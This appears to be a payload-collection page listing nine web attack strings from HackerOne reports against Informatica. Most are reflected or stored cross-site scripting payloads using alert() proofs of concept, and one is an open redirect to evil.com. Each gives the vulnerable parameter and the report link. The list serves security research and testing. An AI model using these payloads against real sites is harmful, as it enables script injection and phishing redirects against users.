# Informatica

9 payloads.

### `d8624a1b`

```
https://target.com/community/marketplace/%22;alert(0
```

— [XSS in Search Communities Function](https://hackerone.com/reports/47235) · Informatica · [ddworken](https://hackerone.com/ddworken)

### `5e09e6db`

```
'"><img src=x onerror=alert(1)>
```

**Parameter:** `company_name`
— [\[target.com\] Reflective XSS](https://hackerone.com/reports/106678) · Informatica · [robd4k](https://hackerone.com/robd4k)

### `18b343d3`

```
https://target.com//evil.com?q=ohdear&a
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/123625) · Informatica · [albinowax](https://hackerone.com/albinowax)

### `abc44652`

```
https://target.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain
```

**Parameter:** `endpoint`
— [\[target.com\] Reflected Cross Site Scripting and Open Redirect](https://hackerone.com/reports/178278) · Informatica · [bogdantc](https://hackerone.com/bogdantc)

### `60ff9897`

```
";alert("XSS in "+document.domain);//
```

**Parameter:** `title`
— [\[target.com\] Persistent XSS through document title](https://hackerone.com/reports/181816) · Informatica · [kasperkarlsson](https://hackerone.com/kasperkarlsson)

### `3194325c`

```
https://target.com/login!input.jspa?referer=javascript:alert(document.domain
```

**Parameter:** `referer`
— [\[target.com\] The login form XSS via the referer value](https://hackerone.com/reports/190016) · Informatica · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `f82adff3`

```
POST /search-solr.jspa HTTP/1.1
Host: target.com

q=%22-alert%28document.domain%29-%22
```

**Parameter:** `q`
— [\[target.com\] Search XSS](https://hackerone.com/reports/200034) · Informatica · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `48034088`

```
"><img src=x onerror=alert(1)>
```

**Parameter:** `title`
— [Stored XSS via Discussion Title and Send as Email attribute in \[target.com\]](https://hackerone.com/reports/203912) · Informatica · [fillawful](https://hackerone.com/fillawful)

### `d12d0f88`

```
http://target.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E
```

**Parameter:** `lang`
— [RXSS in http://target.com](https://hackerone.com/reports/831803) · Informatica · [min4tor](https://hackerone.com/min4tor)
